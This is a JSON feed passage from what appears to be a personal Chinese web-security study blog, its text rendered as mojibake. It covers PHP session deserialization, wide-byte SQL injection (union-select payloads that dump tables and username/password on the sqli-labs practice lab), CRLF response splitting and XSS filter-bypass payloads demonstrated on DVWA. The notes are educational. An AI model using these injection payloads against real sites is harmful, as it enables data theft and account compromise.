<code>$_SESSION</code></li>\n<li>å¯»æ‰¾ PHPSESSID æ–‡ä»¶ï¼Œ<mark> ååºåˆ—åŒ–å‡ºæ•°æ®</mark>æ”¾åœ¨ <code>$_SESSION</code>  ä¸­<br>\næ³¨æ„æ­¤æ—¶ååºåˆ—åŒ–çš„è¯†åˆ«æ–¹å¼å˜æˆäº† php å¤„ç†å™¨çš„ï¼Œè€Œä¸æ˜¯ php_serialize çš„</li>\n</ol>\n<table s:4:name;s:10:phpinfo();;=\"\">\n<thead>\n<tr>\n<th style=\"text-align:center\">é”®å</th>\n<th style=\"text-align:center\">ç«–çº¿</th>\n<th style=\"text-align:center\">ç»è¿‡ serialize () å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">a:1:{s:7:â€œsessionâ€;s:45:&quot;</td>\n<td style=\"text-align:center\">ç«–çº¿</td>\n<td style=\"text-align:center\">O:4:â€œf4keâ€:1:</td>\n</tr>\n</tbody>\n</table>\n<p>æ­¤æ—¶ååºåˆ—åŒ– <code>O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code> , æ‰§è¡Œ phpinfo æ–¹æ³•<br>\nå›¾ç‰‡:<br>\n<img data-src=\"https://s2.loli.net/2023/07/01/1Cc8p6z5xNda3UW.png\" alt=\"å±å¹•æˆªå›¾ 2023-07-01 003026.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
            "url": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
            "title": "å®½å­—èŠ‚æ³¨å…¥å­¦ä¹ ",
            "date_published": "2023-06-29T10:06:07.947Z",
            "content_html": "<h3 id=\"å…ˆä»‹ç»å‡ ä¸ªå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#å…ˆä»‹ç»å‡ ä¸ªå‡½æ•°\">#</a> å…ˆä»‹ç»å‡ ä¸ªå‡½æ•°</h3>\n<ol>\n<li>addslashesï¼šåœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ ï¼ŒNULLï¼‰å‰åŠ åæ–œæ </li>\n<li>mysql_real_escape_stringï¼šè½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ ( <code>\\x00,\\n,\\r,\\,',&quot;,\\x1a</code> )</li>\n</ol>\n<h3 id=\"åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†\">#</a> åŸç†</h3>\n<p>çª„å­—èŠ‚ï¼šå­—ç¬¦å¤§å°ä¸ºä¸€ä¸ªä¸€ä¸ªå­—èŠ‚<br>\nå®½å­—èŠ‚ï¼šå­—ç¬¦å¤§å°ä¸ºä¸¤ä¸ªå­—èŠ‚<br>\næ‰€æœ‰è‹±æ–‡é»˜è®¤å ä¸€ä¸ªå­—èŠ‚ï¼Œæ±‰å­—å ä¸¤ä¸ªå­—èŠ‚<br>\nå¸¸è§çš„å®½å­—èŠ‚ç¼–ç ï¼šGB2312,GBK,GB18030,BIG5,Shift_JIS</p>\n<p>å½“æ•°æ®åº“ç”¨ GBK ç¼–ç è€Œ PHP ç”¨ UTF-8 ç¼–ç ï¼Œå½“é˜²æ­¢ SQL æ³¨å…¥çš„ä¸Šé¢çš„å‡½æ•°å‘æŒ¥ä½œç”¨ï¼Œåœ¨å•åŒå¼•å·å‰åŠ äº†åæ–œæ  <code>\\</code> ã€‚å‡å¦‚æˆ‘ä»¬åœ¨å•åŒå¼•å·å‰åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿å…¶å’Œæ–œæ ç»„åˆæˆä¸€ä¸ªæ±‰å­—ï¼Œä»è€Œä¿ç•™å•åŒå¼•å·ï¼Œä½¿å…¶å‘æŒ¥ä½œç”¨ã€‚<br>\næ³¨æ„ï¼š<br>\næ·»åŠ çš„å­—ç¬¦ ASCII è¦å¤§äº 128ï¼Œä¸¤ä¸ªå­—ç¬¦æ‰èƒ½ç»„åˆæˆæ±‰å­—ï¼Œå› ä¸ºå‰ä¸€ä¸ª ascii ç è¦å¤§äº 128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ ï¼Œè¿™ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œç»å…¸çš„æœ‰ % df</p>\n<p>ä¾‹å­ï¼šSqli-labs32 å…³<br>\nè¾“å…¥ 1â€˜ä¼šè¢«è½¬ä¹‰æˆ <code>1\\'</code> <br>\n è¾“å…¥ 1% dfâ€™%23 å°±å¯ä»¥æˆåŠŸå›æ˜¾<br>\nç„¶åå°±æ˜¯å¸¸è§„çš„å­—ç¬¦å‹æ³¨å…¥<br>\nçˆ†è¡¨ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>\n<p>çˆ†åˆ—åï¼šï¼ˆè¿™é‡Œè¡¨åè¦ç”¨ 16 è¿›åˆ¶ï¼‰</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273%23</span><br></pre></td></tr></table></figure>\n<p>çˆ†å­—æ®µï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(username,0x7e,password)from users%23</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/29/CRLF/",
            "url": "https://hq185187.github.io/2023/06/29/CRLF/",
            "title": "CRLFå­¦ä¹ ",
            "date_published": "2023-06-29T04:23:15.403Z",
            "content_html": "<p>CRLF æ˜¯å›è½¦ï¼‹æ¢è¡Œï¼ˆ <code>\\</code> r <code>\\</code> nï¼‰çš„ç®€ç§°ï¼ŒHTTP çš„ Header å’Œ Body æ˜¯ç”¨ä¸¤ä¸ª <code>\\</code> r <code>\\</code> n åˆ†ç¦»çš„ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥æ„é€  HTTP æ•°æ®åŒ…æ¥å®Œæˆæ³¨å…¥ï¼ˆæ¯”å¦‚ Cookieï¼‰ï¼Œæ‰€ä»¥å®ƒåˆå« HTTP Response Splitting</p>\n<h3 id=\"ä¾‹å­\"><a class=\"markdownIt-Anchor\" href=\"#ä¾‹å­\">#</a> ä¾‹å­</h3>\n<p>æ¯”å¦‚ä¸€èˆ¬ç½‘ç«™ 302 è·³è½¬çš„é¡µé¢å¦‚ä¸‹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 302 Moved Temporarily </span><br><span class=\"line\">Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class=\"line\">Content-Type: text/html </span><br><span class=\"line\">Content-Length: 154 </span><br><span class=\"line\">Connection: close </span><br><span class=\"line\">Location: http://www.sina.com.cn</span><br></pre></td></tr></table></figure>\n<p>å¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ˜¯</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sina.com.cn%0aSet-cookie:test</span><br></pre></td></tr></table></figure>\n<p>Location ä¸‹é¢å°±å¤šäº†ä¸€ä¸ª</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-cookie:test</span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸¤ä¸ª CRLFï¼ˆç¬¬ä¸€ä¸ªæ¥åˆ†ç¦» HTTP çš„å¤´å’Œä½“ï¼‰æ¥é€ æˆä¸€ä¸ªæ— è§†æµè§ˆå™¨ filter çš„åå°„å‹ xss</p>\n<p>æµè§ˆå™¨çš„ filter æ˜¯åœ¨ url ä¸­å«æœ‰ç›¸å…³ç‰¹å¾çš„ xss ä»£ç æ—¶å°±ä¼šè¿‡æ»¤æ‰ä¸æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œå¯ä»¥é€šè¿‡è®¾ç½® X-XSS-Protection:0 æ¥å…³é—­å®ƒ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=%0aX-XSS-Protection: 0%0a%0d%0a%0d&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„crlfæ³¨å…¥æ‰«æå·¥å…·\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„crlfæ³¨å…¥æ‰«æå·¥å…·\">#</a> ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„ CRLF æ³¨å…¥æ‰«æå·¥å…·</h3>\n<p>CRLFsuite:<br>\n åœ°å€ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git clone https://github.com/Nefcore/CRLFsuite.git</span><br><span class=\"line\"></span><br><span class=\"line\">$ cd CRLFsuite</span><br><span class=\"line\"></span><br><span class=\"line\">$ sudo python3 setup.py install</span><br><span class=\"line\"></span><br><span class=\"line\">$ crlfsuite -h</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93b295dW4uanMub3JnL2Ryb3BzL0NSTEYlMjBJbmplY3Rpb24lRTYlQkMlOEYlRTYlQjQlOUUlRTclOUElODQlRTUlODglQTklRTclOTQlQTglRTQlQjglOEUlRTUlQUUlOUUlRTQlQkUlOEIlRTUlODglODYlRTYlOUUlOTAuaHRtbA==\">å‚è€ƒ</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/",
            "url": "https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/",
            "title": "XSSåˆå­¦ä¹ 2",
            "date_published": "2023-06-27T03:12:36.854Z",
            "content_html": "<h2 id=\"xssç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#xssç»•è¿‡\">#</a> XSS ç»•è¿‡</h2>\n<h3 id=\"å¤§å°å†™ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#å¤§å°å†™ç»•è¿‡\">#</a> å¤§å°å†™ç»•è¿‡</h3>\n<p>html å¯¹å¤§å°å†™ä¸æ•æ„Ÿ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(&quot;123&quot;);&lt;/script&gt;</span><br><span class=\"line\">ç­‰ä»·äº</span><br><span class=\"line\">&lt;ScRipt&gt;ALERT(&quot;123&quot;);&lt;/scriPt&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"åŒå†™ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#åŒå†™ç»•è¿‡\">#</a> åŒå†™ç»•è¿‡</h3>\n<p>å¦‚æœ replace å‡½æ•°è¿‡æ»¤äº†æŸä¸ªå…³é”®å­—ï¼Œå°±å¯ä»¥å°è¯•åŒå†™ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å‡å¦‚è¿‡æ»¤alert:</span><br><span class=\"line\">&lt;script&gt;alalertert(&quot;123&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ç©ºæ ¼å›è½¦tabç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ç©ºæ ¼å›è½¦tabç»•è¿‡\">#</a> ç©ºæ ¼å›è½¦ TAB ç»•è¿‡</h3>\n<p>js è§£æåˆ°å®Œæ•´è¯­å¥å¹¶ä¸”è¡Œå°¾å­˜åœ¨æ¢è¡Œç¬¦å°±å¯ä»¥çœè·¯åˆ†å·ï¼Œè‹¥è§£æç¡®å®šä¸æ˜¯å®Œæ•´è¯­å¥ï¼Œåˆ™ä¼šç»§ç»­å¤„ç†ç›´åˆ°è¯­å¥ç»“æŸæˆ–å‡ºç°åˆ†å·<br>\nä»¥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>ä¸ºä¾‹:</p>\n<h4 id=\"ç©ºæ ¼ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ç©ºæ ¼ç»•è¿‡\">#</a> ç©ºæ ¼ç»•è¿‡</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;java script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"å›è½¦ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#å›è½¦ç»•è¿‡\">#</a> å›è½¦ç»•è¿‡</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;java</span><br><span class=\"line\">script:</span><br><span class=\"line\">alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"tabç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#tabç»•è¿‡\">#</a> TAB ç»•è¿‡</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;java    script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"æ³¨é‡Šç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#æ³¨é‡Šç»•è¿‡\">#</a> æ³¨é‡Šç»•è¿‡</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(&quot;123&quot;);&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;scri&lt;!--1--&gt;pt&gt;alert(&quot;123&quot;);&lt;/sc&lt;!--1--&gt;ript&gt;</span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„:<mark> æ³¨é‡Šæœ‰ä¸¤ç§æ–¹æ³•è¡¨ç¤º</mark></p>\n<ol>\n<li><code>&lt;!--1--&gt;</code></li>\n<li>``&lt;!â€“1--!&gt;</li>\n</ol>\n<h3 id=\"ç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ç¼–ç ç»•è¿‡\">#</a> ç¼–ç ç»•è¿‡</h3>\n<h4 id=\"unicodeç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#unicodeç¼–ç ç»•è¿‡\">#</a> unicode ç¼–ç ç»•è¿‡</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;&lt;\\u4e00&gt;&#x27;)&quot;&gt;test&lt;/a&gt;</span><br><span class=\"line\">\\u4e00æ˜¯ä¸€çš„Unicodeç¼–ç </span><br><span class=\"line\">ç­‰äº</span><br><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;&lt;ä¸€&gt;&#x27;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"urlç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#urlç¼–ç ç»•è¿‡\">#</a> url ç¼–ç ç»•è¿‡</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:%61%6C%65%72%74%28%22%78%73%73%22%29%3B;&quot;&gt;xss&lt;/a&gt;</span><br><span class=\"line\">ç­‰ä»·äº:</span><br><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"asciiç \"><a class=\"markdownIt-Anchor\" href=\"#asciiç \">#</a> ascii ç </h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class=\"line\">ç­‰ä»·</span><br><span class=\"line\">&lt;a href=&quot;javascript:97,108,101,114,116,40,34,120,115,115,34,41,59&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>è¿˜æœ‰ hrml å®ä½“ç¼–ç ç»•è¿‡ï¼Œbase64 ç¼–ç ï¼Œåè¿›åˆ¶å…«è¿›åˆ¶ç»•è¿‡ç­‰ç­‰<br>\nè¿‡æ»¤å•åŒå¼•å·ç”¨åå¼•å·<code>``</code>æ›¿ä»£</p>\n<p>æ›´å¤šçš„ç»•è¿‡çœ‹è¿™ç¯‡<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUwODU0NzkwL2FydGljbGUvZGV0YWlscy8xMjQyOTcwNDY=\">ç»•è¿‡å¤§å…¨</span><br>\nå…³äºç¼–ç ç»•è¿‡çœ‹<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8xMDMuaHRtbA==\">è¿™ç¯‡</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/",
            "url": "https://hq185187.github.io/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/",
            "title": "XSSåˆå­¦ä¹ 1",
            "date_published": "2023-06-26T11:55:23.905Z",
            "content_html": "<h2 id=\"xssä»‹ç»\"><a class=\"markdownIt-Anchor\" href=\"#xssä»‹ç»\">#</a> XSS ä»‹ç»</h2>\n<h3 id=\"xssç®€å†\"><a class=\"markdownIt-Anchor\" href=\"#xssç®€å†\">#</a> XSS ç®€å†</h3>\n<p>XSS æ”»å‡»é€šå¸¸æŒ‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯ JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬ Javaã€Â VBScriptã€ActiveXã€ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„ HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°åŒ…æ‹¬ä½†ä¸é™äºæ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œ cookie ç­‰å„ç§å†…å®¹ã€‚</p>\n<h3 id=\"xssåŸç†\"><a class=\"markdownIt-Anchor\" href=\"#xssåŸç†\">#</a> XSS åŸç†</h3>\n<p>ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºçš„æ§åˆ¶ä¸å¤Ÿä¸¥æ ¼ï¼Œå¯¼è‡´æ„å»ºçš„æ¶æ„ä»£ç è¾“å…¥åï¼Œåœ¨å‰ç«¯æµè§ˆçš„æ—¶å€™è¢«å½“ä½œæœ‰æ•ˆçš„ä»£ç è§£ææ‰§è¡Œï¼Œä»è€Œäº§ç”Ÿå±å®³</p>\n<h2 id=\"xssåˆ†ç±»\"><a class=\"markdownIt-Anchor\" href=\"#xssåˆ†ç±»\">#</a> XSS åˆ†ç±»</h2>\n<h3 id=\"åå°„å‹\"><a class=\"markdownIt-Anchor\" href=\"#åå°„å‹\">#</a> åå°„å‹</h3>\n<p>å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ä½œä¸ºä»£ç è®©æµè§ˆå™¨æ‰§è¡Œï¼Œä¸€èˆ¬éœ€è¦å¼•è¯±ç”¨æˆ·è®¿é—®æ”»å‡»è€…æ„é€ çš„ urlï¼Œæ”»å‡»å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼ŒéæŒä¹…å‹</p>\n<p>ä½ç½®ï¼šç”¨æˆ·ç™»å½•å…¥å£ï¼Œç½‘ç«™æœç´¢æ¡†ç­‰</p>\n<p>æ¡ˆä¾‹ï¼šDVWA<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/igRd3bOoJtVz5DY.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-26 105406.png\"></p>\n<h3 id=\"å­˜å‚¨å‹\"><a class=\"markdownIt-Anchor\" href=\"#å­˜å‚¨å‹\">#</a> å­˜å‚¨å‹</h3>\n<p>å°†æ”»å‡»è„šæœ¬æ°¸è¿œåµŒå…¥ä¸€ä¸ªé¡µé¢ä¸­ï¼Œç”¨æˆ·è®¿é—®æ—¶è‡ªå·±è§¦å‘ï¼Œè¿™ä¸ªæ¶æ„ç¨‹åºè¢«ä¿å­˜åœ¨æœåŠ¡ç«¯æ•°æ®åº“ä¸­ï¼Œå±äºå‘ç”Ÿåœ¨å®¢æˆ·ç«¯çš„æ”»å‡»ï¼Œæ˜¯æŒä¹…å‹çš„ã€‚</p>\n<p>æ¡ˆä¾‹ï¼šDVWA<br>\n å…ˆå¼¹ä¸€ä¸ª cookieï¼Œç‚¹å‡»åˆ«çš„é¡µé¢ç¦»å¼€ï¼Œå†è¿”å›è¿™ä¸ªé¡µé¢ä¼šè‡ªåŠ¨å¼¹ cookie<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/TJC6ANsx5w3ySpO.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-26 111329.png\"></p>\n<h3 id=\"domå‹\"><a class=\"markdownIt-Anchor\" href=\"#domå‹\">#</a> DOM å‹</h3>\n<p>DOM å…¨ç§° Document Object Modelï¼Œæ˜¯ä¸€ä¸ªä¸å¹³å°ï¼Œç¼–ç¨‹è¯­è¨€æ— å…³çš„æ¥å£ï¼Œå…è®¸ç¨‹åºæˆ–è€…è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ï¼Œç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœèƒ½å¤Ÿæˆä¸ºæ˜¾ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚ç”±äº DOM å‹ XSS ä¸ä¸åå°æœåŠ¡å™¨äº§ç”Ÿæ•°æ®äº¤äº’ï¼Œæ˜¯ä¸€ç§é€šè¿‡ DOM æ“ä½œå‰ç«¯ä»£ç è¾“å‡ºçš„æ—¶å€™äº§ç”Ÿçš„é—®é¢˜ï¼Œå¤§éƒ¨åˆ†å±äºåå°„å‹<br>\næ¡ˆä¾‹ï¼šDVWA<br>\nDOM å‹ä¸ä¸æœåŠ¡ç«¯äº¤äº’æ•°æ®ï¼Œå®Œå…¨çš„å‰ç«¯æ‰§è¡Œæ¶æ„ä»£ç ï¼Œè¿™é‡Œå¯ä»¥ select ä¸€ä¸ªè¯­è¨€ï¼Œé€‰ english è§‚å¯Ÿ url æœ‰ï¼Ÿdefault=english, ç›´æ¥æ„é€ <br>\n<img data-src=\"https://s2.loli.net/2023/06/26/WaRwV9Cjf67LqZo.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-26 112550.png\"></p>\n<h2 id=\"å¸¸ç”¨æ”»å‡»æ ‡ç­¾\"><a class=\"markdownIt-Anchor\" href=\"#å¸¸ç”¨æ”»å‡»æ ‡ç­¾\">#</a> å¸¸ç”¨æ”»å‡»æ ‡ç­¾</h2>\n<h3 id=\"script\"><a class=\"markdownIt-Anchor\" href=\"#script\">#</a> script</h3>\n<p><code>&lt;scirpt&gt;alert(&quot;document.cookie&quot;);&lt;/script&gt;</code></p>\n<h3 id=\"img\"><a class=\"markdownIt-Anchor\" href=\"#img\">#</a> img</h3>\n<p>å›¾ç‰‡åŠ è½½é”™è¯¯æ—¶è§¦å‘</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°å…ƒç´ æ—¶è§¦å‘</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>é¼ æ ‡æŒ‡é’ˆç§»å‡ºæ—¶è§¦å‘</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"a\"><a class=\"markdownIt-Anchor\" href=\"#a\">#</a> a</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=javascript:alert(&#x27;1&#x27;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"input\"><a class=\"markdownIt-Anchor\" href=\"#input\">#</a> input</h3>\n<p>æŒ‰ä¸‹æŒ‰é”®æ—¶è§¦å‘<br>\nç¤ºä¾‹ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æŒ‰ä¸‹æŒ‰é”®æ—¶è§¦å‘</span><br><span class=\"line\">ç¤ºä¾‹ï¼š&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ¾å¼€æŒ‰é”®å¼æ—¶è§¦å‘</span><br><span class=\"line\">ç¤ºä¾‹ï¼š&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ç«äº‰ç„¦ç‚¹ï¼Œä»è€Œè§¦å‘onbluräº‹ä»¶</span><br><span class=\"line\"></span><br><span class=\"line\">ç¤ºä¾‹ï¼š&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"style\"><a 